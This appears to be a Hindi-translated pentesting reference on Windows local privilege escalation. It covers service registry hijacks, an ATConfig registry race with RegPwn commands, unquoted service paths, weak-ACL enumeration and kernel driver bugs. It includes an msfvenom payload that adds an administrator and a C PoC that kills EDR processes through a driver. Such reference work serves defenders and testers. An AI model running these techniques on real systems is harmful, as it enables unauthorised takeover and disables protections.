मूल permission test इस प्रकार बताया गया था:

यह जांचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। अगर हैं, तो service द्वारा execute किए जाने वाले binary को बदला जा सकता है।

जांचें कि किसी खास service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। केवल ACL entry होने से effective access साबित नहीं होता: deny entries, current token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए एक उपयोगी service configuration field, service को trigger करने का तरीका और अधिक privileged service identity भी आवश्यक हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

execute किए जाने वाले binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race से arbitrary HKLM value write (ATConfig)

Windows की कुछ Accessibility सुविधाएँ प्रति-user **ATConfig** keys बनाती हैं, जिन्हें बाद में **SYSTEM** process एक HKLM session key में कॉपी करता है। Registry **symbolic link race** के ज़रिए इस privileged write को किसी भी **HKLM path** पर redirect किया जा सकता है, जिससे arbitrary HKLM **value write** primitive मिलता है।<sup>[[18]](#references)</sup>

मुख्य locations (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में installed accessibility features की सूची होती है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में user-controlled configuration store होती है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाई जाती है और user द्वारा writable होती है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value सेट करें जिसे SYSTEM से लिखवाना है।
2. secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock fire होने पर **HKLM Session ATConfig** key को protected HKLM target की ओर इंगित करने वाले **registry link** से बदलें।
4. SYSTEM attacker द्वारा चुनी गई value को redirected HKLM path पर लिखता है।

Arbitrary HKLM value write मिलने के बाद, service configuration values overwrite करके LPE तक पहुँचें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे सामान्य user start कर सके (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **ध्यान दें:** public exploit implementation race के हिस्से के रूप में workstation को **lock** करता है।

उदाहरण tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

अगर आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, **arbitrary code execute करने के लिए इतना काफी है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

अगर executable का path quotes के अंदर नहीं है, तो Windows space से पहले आने वाले हर ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows इन्हें execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

सभी unquoted service paths सूचीबद्ध करें, built-in Windows services से जुड़े paths को छोड़कर:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप metasploit से** इस vulnerability का पता लगा सकते हैं और इसका exploit कर सकते हैं: `exploit/windows/local/trusted\_service\_path` आप metasploit से मैन्युअल रूप से service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### रिकवरी कार्रवाइयाँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने देता है कि कोई service विफल होने पर कौन-सी कार्रवाइयाँ की जाएँ। इस सुविधा को किसी binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदला जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task की script के लक्ष्य

`cmd.exe /c` चलाने वाले और `.bat` या `.cmd` फ़ाइल इस्तेमाल करने वाले किसी enabled task के लिए, `cmd.exe` के साथ-साथ **action arguments** में दी गई script भी जाँचें। यही बात interpreter के स्पष्ट file argument पर भी लागू होती है, जैसे PowerShell का `-File`। यदि किसी scheduled batch file में PowerShell `-File` की सीधी call हो, तो उस संदर्भित script की ACL भी जाँचें; variables, conditionals और shell chaining के लिए मैन्युअल रूप से ट्रेस करना ज़रूरी है। caller द्वारा लिखी जा सकने वाली script या parent directory, cross-account execution का संकेत तभी है जब कॉन्फ़िगर किया गया task principal caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL मायने रख सकती है, लेकिन पहले से मौजूद `exit` या अन्य control flow के कारण जोड़ी गई lines तक पहुँचना संभव न हो। privilege escalation का दावा करने से पहले प्रभावी ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory बनाते समय script में बदलाव न करें और task शुरू न करें।

## पहुँच योग्य फ़ाइलों में named streams

NTFS पर किसी पढ़ी जा सकने वाली फ़ाइल में `:$DATA` नाम का stream हो सकता है, जिसकी सामग्री सामान्य directory listing में नहीं दिखाई देती। पहुँच योग्य backups या configuration files के छोटे, प्रासंगिक समूह के लिए, किसी भी सामग्री को खोलने से पहले stream के **नाम और आकार** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) के ज़रिए और PowerShell इन्हें [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के ज़रिए उपलब्ध कराता है। किसी stream का नाम secret का संकेत दे, तो वह केवल एक सुराग है। फ़ाइल की प्रभावी read access, filesystem में stream support, stream में इस्तेमाल किए जा सकने वाले credentials की मौजूदगी और उन credentials से वास्तव में authenticate होने वाले account की जाँच करें। नियमित enumeration के दौरान recursive stream scans और stream की सामग्री प्रिंट करने से बचें।

## Scheduled Windows Driver Kit helper inputs

वैकल्पिक Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपनी run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` फ़ाइल का उपयोग कर सकता है। कोई scheduled task या service यदि इस helper को privileged account से शुरू करती है, तो इन inputs पर low-privilege write access उस account के context में command execution करा सकती है—भले ही helper executable स्वयं सुरक्षित हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या बदली जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action की [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths की ACLs जाँचें। यदि task में working directory निर्दिष्ट नहीं है, तो executable की directory केवल जाँचने योग्य सुराग है, इस बात का प्रमाण नहीं कि task अपने inputs वहीं से पढ़ता है। Project की working file से जुड़ी prerequisite भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, उसके वास्तविक task principal की जाँच करें।

## Applications

### Installed Applications

**Binaries की permissions** जाँचें (हो सकता है आप किसी binary को overwrite करके privileges escalate कर सकें) और **folders की permissions** भी ([DLL Hijacking](dll-hijacking/index.html))।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent की repair प्रक्रिया

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और फिर replacement विफल होने पर पहले से मौजूद write-protected file को execute करते थे। vendor ने 2.1.0p40, 2.2.0p23, 2.3.0b1 और 2.4.0b1 में इस समस्या को ठीक किया। पूरा installed patch level और यह जाँचें कि प्रभावित agent operation चल सकता है या नहीं; केवल `2.1` जैसा branch label exposure की पुष्टि नहीं कर सकता। Enumeration में files बनाए या agent commands trigger किए बिना version, service state और Temp permissions की जाँच की जा सकती है।

#### ADSelfService Plus SAML service की समीक्षा

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ने build 6210 और उससे पहले के ADSelfService Plus को प्रभावित किया; vendor ने इसे build 6211 में ठीक किया। यह तभी प्रासंगिक है जब SAML SSO **सक्षम है या पहले सक्षम था**। इसलिए installed-product entry या service path केवल एक सुराग है, vulnerability का निष्कर्ष नहीं: सटीक build, SAML configuration का इतिहास, service की network reachability और यह पुष्टि करें कि service किस account के अंतर्गत चलती है। Service के ज़रिए code execution को उसी account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के अंतर्गत चलना ज़रूरी है। Product की Backup directory में पढ़ी जा सकने वाली `OfflineBackup_*.ezip` एक अलग encrypted backup का सुराग है, न कि उपयोग योग्य credential या इस SAML flaw का सबूत। नियमित enumeration के दौरान इसे unpack किए बिना इसका path और access rights दर्ज करें।

#### Jenkins controller और domain-account की सीमाएँ

Windows Jenkins controller पर, job बनाने या configure करने की permission और उसे शुरू करने की permission में अंतर करें: [Jenkins documents these as separate `Job/Create`, `Job/Configure`, and `Job/Build` rights](https://www.jenkins.io/doc/book/security/access-control/permissions/). Configured schedule या remote trigger से build चलाने का एक और रास्ता मिल सकता है, लेकिन पुष्टि करें कि वह सक्षम है और build वास्तव में चलता है। Execution को controller या चुने गए agent की identity मिलती है, और stored credential का उपयोग तभी किया जा सकता है जब job को उसके scope तक पहुँच हो। अलग से, `JENKINS_HOME` metadata तक access की जाँच करें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret` और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). इनका मौजूद होना अपने आप password उजागर नहीं करता; साझा output में secrets दिखाए बिना **ज़रूरी files तक read access** और account reuse का एक अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object के `scriptPath` पर write right है, तो cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाले वास्तविक logon या scheduled consumer की पुष्टि करें। आगे का group control अलग से सत्यापित प्रभावी AD rights पर निर्भर करता है।

#### Azure Pipelines self-hosted agent की identity

Azure DevOps Server या Azure Pipelines project में, pipeline **बनाने या edit करने** की permission को उसे **queue** करने और चुने गए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft documents pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दस्तावेज़ित करता है। यदि कम-privileged account script step submit कर सकता है और उस pipeline को self-hosted Windows agent पर चला सकता है, तो step [agent's configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले सटीक pipeline, branch/resource restrictions, authorized pool, चल सकने वाला job और agent service identity सत्यापित करें। Installed agent, project role या repository write permission अपने आप में केवल एक सुराग है; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की समीक्षा करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft distinguishes](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account** को—जो synchronization service चलाता है और अपने SQL database तक पहुँचता है—**AD DS connector account** से, जिसकी directory permissions configured sync features पर निर्भर करती हैं। Connector credentials उस database में encrypted रूप से stored होते हैं; key material [protected by DPAPI under the ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account) होता है। Installed sync service, local administrator जैसा नाम रखने वाला group या database की visibility, अकेले decrypt किए जा सकने वाले credential या domain escalation की पुष्टि नहीं करते। Actual database read rights, service-account/key access, installation और SQL layout, configured connector identity और उस identity के प्रभावी AD privileges की अलग-अलग समीक्षा करें। नियमित enumeration में केवल service और access metadata दिखाएँ, stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver अपनी support DLLs को `C:\ProgramData` के अंतर्गत रख सकता है और उन्हें अधिक privileged print process में load कर सकता है। Printer WMI enumeration अस्वीकृत होने पर भी, parent directories और reparse points सहित, सटीक driver directory और DLL ACLs की समीक्षा करें। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए बताया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [the original disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) में `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन है। Writable ACL केवल एक सुराग है: deny entries के बाद प्रभावी write access, संबंधित driver के installed होने और privileged identity के अंतर्गत file load करने, और vendor के updated driver या security program से installation ठीक हुई है या नहीं—इनकी पुष्टि करें। केवल directory name या driver version के आधार पर vulnerability का निष्कर्ष न निकालें।

### लिखने की अनुमतियाँ

जाँचें कि क्या आप किसी config file में बदलाव करके किसी विशेष file को पढ़ सकते हैं, या किसी ऐसी binary में बदलाव कर सकते हैं जिसे Administrator account के अंतर्गत execute किया जाना है (schedtasks)।

System में कमज़ोर folder/files permissions खोजने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders में मौजूद किसी भी plugin DLL को autoload करता है। यदि कोई writable portable/copy install मौजूद है, तो malicious plugin डालने से हर launch पर `notepad++.exe` के अंदर automatic code execution होता है (जिसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**जाँचें कि क्या आप किसी ऐसी registry या binary को overwrite कर सकते हैं जिसे कोई दूसरा user execute करने वाला है।**\
**यह जानने के लिए कि privileges escalate करने के लिए कौन-सी autoruns locations दिलचस्प हैं, नीचे दिया गया page पढ़ें:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party अजीब/कमज़ोरियों वाले** drivers खोजें

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver arbitrary kernel read/write primitive उपलब्ध कराता है (जो खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम है), तो आप kernel memory से सीधे SYSTEM token चुराकर privilege escalate कर सकते हैं।<sup>[[13]](#references)</sup> चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel-exploitation से संबंधित सामग्री:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Race-condition bugs में, जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या deep directory chains का उपयोग करके) से window को microseconds से बढ़ाकर tens of microseconds तक किया जा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, and I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमज़ोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock अभी held रहते request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation को leak करती है।<sup>[[29]](#references)</sup>

Audit और exploitation नोट्स:

- **Free-under-lock + cancel afterwards**: ऐसी success path देखें जो **Acquire -> CompleteRequest/free -> Release** करती हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करती हो। यदि success path CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचती है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में आगे बढ़कर freed `PFLT_CALLBACK_DATA` को driver के remove callback में भेज सकती है।
- Freed queue object को same-sized, attacker-controlled paged-pool allocation से **reclaim** करें। `NPFS` Data Queue Entries उपयोगी हैं, क्योंकि payload और size नियंत्रित किए जा सकते हैं और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हैं, तो उन्हें **user memory में fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर रुकने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount-adjacent fields) में उपयोग होने वाले nested context pointer को redirect करती है, तो आपको **address-controlled but not value-controlled** kernel write मिल सकती है। ऐसी स्थिति में, किसी अंतिम code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray को enumerate करें, जब तक corrupted object से **out-of-bounds paged-pool read** न मिले।
- **Raceable disclosure pattern**: कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता है, एक मज़बूत candidate है। Reliability तब बढ़ती है जब attacker copied buffer को बड़ा कर सकता है (उदाहरण के लिए, कई list/resource entries जोड़कर, जिससे serializer का final allocation size बढ़ जाए), क्योंकि इससे लंबा copy replacement window को चौड़ा करता है और ज़रूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays बेहतरीन disclosure targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से एक array leak करें, आसपास का `IORING_OBJECT` recover करें, फिर **`RegBuffers`** और **`RegBuffersCount`** को corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का उपयोग करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write से आपको stable byte मिलता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो **overlapping unaligned writes** का उपयोग करके `0x0101010101010101` जैसा repeated-byte user pointer बनाएँ, उसे `VirtualAlloc` से map करें और forged registered-buffer array वहाँ रखें।<sup>[[30]](#references)</sup>

उपयोगी debugging संकेत:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

एक बार corrupted I/O ring से arbitrary kernel read/write प्राप्त कर लेने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने, और custom driver के बिना metadata corruption को kernel paged-pool overflows में बदलने देती हैं। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` attacker-controlled paths से direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह जाँचते हैं कि वह एक मान्य UTF-16 string है, और फिर stack scalar जैसे `int readValue` में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` को call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद नहीं है, तो `EntryContext` की व्याख्या developer की अपेक्षा के अनुसार नहीं, बल्कि registry के **वास्तविक** type के अनुसार होती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path से driver को attacker द्वारा चुनी गई keys query करने, return codes/logs के ज़रिए उनके मौजूद होने का पता leak करने, और कभी-कभी वे values पढ़ने के लिए कहा जा सकता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination, registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING`, या आकार वाले binary buffer के रूप में type-confused हो जाता है।

व्यावहारिक exploitation संबंधी नोट्स:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी **untrusted hive** को hit करती है, लेकिन उसमें `RTL_QUERY_REGISTRY_TYPECHECK` नहीं है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, `HKCU` के अंतर्गत values stage करने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, फिर sandboxed contexts से पहुँच योग्य keys खोजने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएँ:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write करने से पास का stack data corrupt हो जाता है और पास के callback/function pointer का कुछ हिस्सा overwrite हो सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` के `UNICODE_STRING` की ओर point करने की अपेक्षा होती है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित करता है और `Buffer` pointer को आंशिक रूप से प्रभावित करता है, जिससे semi-controlled kernel write हो सकता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर पहले `LONG` को signed buffer size मानता है। अगर पिछले `REG_DWORD` read से दोबारा इस्तेमाल किए गए scalar में attacker-controlled **negative** value रह जाती है, तो अगली `REG_BINARY` query attacker के bytes को सीधे पास के stack slots पर copy कर देती है। यह अक्सर callback pointer को पूरी तरह overwrite करने का सबसे आसान तरीका होता है।

हंटिंग का एक मज़बूत पैटर्न: **एक ही stack variable में बिना उसे reinitialize किए अलग-अलग प्रकार के registry reads करना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers, और उन code paths को खोजें जहाँ पहला registry read यह नियंत्रित करता है कि दूसरा read होगा या नहीं।

#### device objects पर FILE_DEVICE_SECURE_OPEN सेट न होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers IoCreateDeviceSecure के ज़रिए मज़बूत SDDL के साथ अपना device object बनाते हैं, लेकिन `DeviceCharacteristics` में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, जब device को अतिरिक्त component वाले path के ज़रिए खोला जाता है, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user इस तरह के namespace path का इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

जब कोई user device खोल सकता है, तो driver द्वारा उपलब्ध कराए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी प्रतिबंध के raw disk read/write (offline tampering, boot-time persistence tricks)।
- मनमाने processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) भी शामिल हैं; इससे kernel के ज़रिए user land से AV/EDR kill किया जा सकता है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

डेवलपर्स के लिए Mitigations
- DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- Privileged operations के लिए caller context को validate करें। Process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Defenders के लिए Detection ideas
- संदिग्ध device names (जैसे, \\ .\\amsdk*) को user-mode से खोलने और दुरुपयोग के संकेत देने वाले विशिष्ट IOCTL sequences को monitor करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास **PATH में मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा load की गई DLL को hijack करके **escalate privileges** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH में मौजूद सभी folders की permissions जाँचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस check का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के माध्यम से Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** का एक variant है, जो **Node.js** और **Electron** applications को प्रभावित करता है, जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं होता**।<sup>[[20]](#references)</sup>

Node, directory tree में ऊपर की ओर जाते हुए हर parent में `node_modules` folders जाँचता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application इन paths को जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

